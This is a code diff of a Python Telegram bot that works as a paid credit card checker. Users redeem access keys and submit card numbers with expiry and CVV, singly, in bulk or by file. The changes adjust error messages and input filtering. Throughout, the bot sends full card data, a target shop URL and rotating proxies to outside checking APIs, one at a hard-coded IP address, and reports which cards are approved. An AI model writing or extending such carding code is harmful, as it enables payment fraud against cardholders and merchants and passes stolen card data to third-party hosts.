@@ -212,7 +212,7 @@ async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text("✅ Sub Active!")
     
-    # Send notification to all admins with User Name, Username, and User ID
+    # Send notification to admins with Name, Username, and User ID
     username_str = f"@{user.username}" if user.username else "No Username"
     admin_notification = (
         f"🔔 **New Key Redeemed!**\n"
@@ -256,12 +256,9 @@ async def process_card_string(card_line, user_full_name):
     try:
         parts = card_line.split('|')
         if len(parts) < 4:
-            return f"❌ Wrong ❌ or invalid card number: {card_line}"
+            return f"❌ {card_line} ➔ Invalid Format"
         
         cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
-        if not cc.isdigit() or not mes.isdigit() or not ano.isdigit() or not cvv.isdigit():
-            return f"❌ Wrong ❌ or invalid card number: {card_line}"
-            
         formatted_cc = f"{cc}|{mes}|{ano}|{cvv}"
         bin_info, bank_info, country_info = await get_bin_info(cc[:6])
         
@@ -292,7 +289,7 @@ async def process_card_string(card_line, user_full_name):
 
             # --- API 3: Custom IP API ---
             if not res_data or str(res_data.get("Approved", "False")).lower() != "true":
-                api_url_3 = f"http://216.250.119.63/?{quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxies[2])}"
+                api_url_3 = f"http://216.250.119.63/?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxies[2])}"
                 try:
                     response = await client.get(api_url_3)
                     if response.status_code == 200:
@@ -301,7 +298,7 @@ async def process_card_string(card_line, user_full_name):
                     pass
 
         if not res_data:
-            return f"❌ Wrong ❌ or invalid card number: {card_line} (All APIs failed)"
+            return f"❌ {card_line} ➔ All 3 APIs & Proxies failed/timed out."
         
         resp_status = res_data.get("Response", "UNKNOWN")
         price = res_data.get("Price", "$14.97")
@@ -326,7 +323,7 @@ async def process_card_string(card_line, user_full_name):
             f"👤 Checked By ➠ {user_full_name}"
         )
     except Exception:
-        return f"❌ Wrong ❌ or invalid card number: {card_line}"
+        return f"❌ {card_line} ➔ Error occurred."
 
 card_semaphore = asyncio.Semaphore(5)
 
@@ -341,11 +338,8 @@ async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if user_id in BANNED_USERS or not has_access(user_id):
         await update.message.reply_text("⛔ Access Denied! Use `/redeem <key>`.")
         return
-    
     if not context.args:
-        await update.message.reply_text("⚠️ **Wrong format!**\nUse: `/chk cc|mm|yy|cvv`", parse_mode="Markdown")
         return
-        
     msg = await update.message.reply_text("⏳ Processing with 3 APIs & 3 Proxies...")
     result = await process_card_string(" ".join(context.args), update.effective_user.first_name)
     await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=result)
@@ -360,10 +354,8 @@ async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     cards_text = update.message.text.replace("/chks", "").strip()
     if not cards_text:
-        await update.message.reply_text("⚠️ Please provide cards list for bulk check!")
         return
-    
-    card_lines = [l.strip() for l in cards_text.split("\n") if l.strip()][:10]
+    card_lines = [l.strip() for l in cards_text.split("\n") if l.strip() and "|" in l][:10]
     if not card_lines:
         return
 
@@ -392,7 +384,7 @@ async def chf_file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         file = await context.bot.get_file(document.file_id)
         file_bytes = await file.download_as_bytearray()
-        card_lines = [l.strip() for l in file_bytes.decode("utf-8", errors="ignore").split("\n") if l.strip()][:10]
+        card_lines = [l.strip() for l in file_bytes.decode("utf-8", errors="ignore").split("\n") if l.strip() and "|" in l][:10]
         
         tasks = [safe_process_card(line, update.effective_user.first_name) for line in card_lines]
         results = await asyncio.gather(*tasks)
